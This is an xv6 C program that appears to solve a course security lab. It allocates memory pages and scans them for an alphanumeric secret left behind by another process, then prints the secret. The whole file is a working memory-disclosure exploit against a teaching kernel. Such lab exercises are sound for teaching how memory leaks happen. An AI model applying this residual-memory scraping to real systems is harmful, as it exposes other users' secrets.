#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

int
main(int argc, char *argv[])
{
  // Allocate a large amount of memory to increase chances of getting
  // pages that were previously used by secret.c
  char *mem = sbrk(4096 * 10);  // Allocate 10 pages
  
  if (mem == (char*)-1) {
    fprintf(2, "sbrk failed\n");
    exit(1);
  }
  
  // Search through the allocated memory for the secret string
  // The secret will be a null-terminated string containing only
  // alphanumeric characters
  for (int i = 0; i < 4096 * 10; i++) {
    // Check if this looks like the start of a valid string
    if (mem[i] != 0 && mem[i] >= 32 && mem[i] <= 126) {
      int j = i;
      int valid = 1;
      int len = 0;
      
      // Check if we have a contiguous string of printable characters
      while (j < 4096 * 10 && mem[j] != 0) {
        // Secret contains only alphanumeric characters
        if (!((mem[j] >= 'a' && mem[j] <= 'z') ||
              (mem[j] >= 'A' && mem[j] <= 'Z') ||
              (mem[j] >= '0' && mem[j] <= '9'))) {
          valid = 0;
          break;
        }
        len++;
        j++;
      }
      
      // If we found a valid alphanumeric string of reasonable length
      if (valid && len > 0 && len < 100) {
        // Print the secret
        for (int k = i; k < i + len; k++) {
          printf("%c", mem[k]);
        }
        printf("\n");
        exit(0);
      }
    }
  }
  
  exit(0);
}
